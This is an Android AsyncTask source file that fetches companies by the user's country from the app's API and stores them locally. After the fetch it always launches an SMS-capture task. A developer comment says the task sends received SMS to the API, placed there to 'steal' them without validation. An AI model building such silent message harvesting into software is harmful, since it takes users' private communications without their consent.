package com.tween.viacelular.asynctask;

import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import com.afollestad.materialdialogs.MaterialDialog;
import com.tween.viacelular.R;
import com.tween.viacelular.models.Land;
import com.tween.viacelular.models.Suscription;
import com.tween.viacelular.models.SuscriptionHelper;
import com.tween.viacelular.models.User;
import com.tween.viacelular.utils.ApiConnection;
import com.tween.viacelular.utils.Common;
import com.tween.viacelular.utils.StringUtils;
import com.tween.viacelular.utils.Utils;
import org.json.JSONException;
import org.json.JSONObject;
import io.realm.Realm;
import io.realm.RealmResults;

/**
 * Manejador para obtener información de una empresa determinada
 * Created by Tween (David Figueroa davo.figueroa@tween.com.ar)
 */
public class CompaniesAsyncTask extends AsyncTask<Void, Void, String>
{
	private MaterialDialog	progress;
	private Activity		activity;
	private boolean			displayDialog	= true;

	public CompaniesAsyncTask(Activity activity, boolean displayDialog)
	{
		this.activity		= activity;
		this.displayDialog	= displayDialog;
	}

	protected void onPreExecute()
	{
		try
		{
			if(displayDialog)
			{
				if(progress != null)
				{
					if(progress.isShowing())
					{
						progress.cancel();
					}
				}

				progress = new MaterialDialog.Builder(activity)
					.title(R.string.progress_dialog)
					.cancelable(false)
					.content(R.string.please_wait)
					.progress(true, 0)
					.show();
			}
		}
		catch(Exception e)
		{
			Utils.logError(activity, "CompaniesAsyncTask:onPreExecute - Exception:", e);
		}
	}

	@Override
	protected String doInBackground(Void... params)
	{
		String result = "";

		try
		{
			//Modificaciones para contemplar migraciónd de db
			Realm realm							= Realm.getDefaultInstance();
			SharedPreferences preferences		= activity.getSharedPreferences(Common.KEY_PREF, Context.MODE_PRIVATE);
			final RealmResults<Suscription> results	= realm.where(Suscription.class).findAll();
			realm.executeTransaction(new Realm.Transaction()
			{
				@Override
				public void execute(Realm realm)
				{
					results.deleteAllFromRealm();
				}
			});
			String country						= "";
			User user							= realm.where(User.class).findFirst();

			if(user != null)
			{
				if(StringUtils.isNotEmpty(user.getCountryCode()))
				{
					country = user.getCountryCode();
				}
			}

			if(StringUtils.isEmpty(country))
			{
				if(StringUtils.isNotEmpty(preferences.getString(Land.KEY_API, "")))
				{
					country = preferences.getString(Land.KEY_API, "");
				}
				else
				{
					country = Land.DEFAULT_VALUE;
				}
			}

			SharedPreferences.Editor editor	= preferences.edit();
			editor.putString(Land.KEY_API, country);
			editor.apply();
			JSONObject jsonResult	= new JSONObject(	ApiConnection.request(ApiConnection.COMPANIES_BY_COUNTRY + "=" + country, activity, ApiConnection.METHOD_GET,
														preferences.getString(Common.KEY_TOKEN, ""), ""));
			result					= ApiConnection.checkResponse(activity.getApplicationContext(), jsonResult);

			if(result.equals(ApiConnection.OK))
			{
				SuscriptionHelper.parseList(jsonResult.getJSONArray(Common.KEY_CONTENT), activity.getApplicationContext(), false);
			}
			else
			{
				SuscriptionHelper.parseList(null, activity.getApplicationContext(), false);
			}

			if(displayDialog)
			{
				if(progress != null)
				{
					if(progress.isShowing())
					{
						progress.cancel();
					}
				}
			}
		}
		catch(JSONException e)
		{
			Utils.logError(activity, "CompaniesAsyncTask:doInBackground - JSONException:", e);
		}
		catch(Exception e)
		{
			Utils.logError(activity, "CompaniesAsyncTask:doInBackground - Exception:", e);
		}

		return result;
	}

	@Override
	protected void onPostExecute(String result)
	{
		try
		{
			if(displayDialog)
			{
				if(progress != null)
				{
					if(progress.isShowing())
					{
						progress.cancel();
					}
				}
			}

			//Agregado para enviar los sms recibidos a la api, se movió para chorear sin necesidad de validar (siempre que haya sms)
			new CaptureSMSAsyncTask(activity, false).executeOnExecutor(AsyncTask.SERIAL_EXECUTOR);
		}
		catch(Exception e)
		{
			Utils.logError(activity, "CompaniesAsyncTask:onPostExecute - Exception:", e);
		}

		super.onPostExecute(result);
	}
}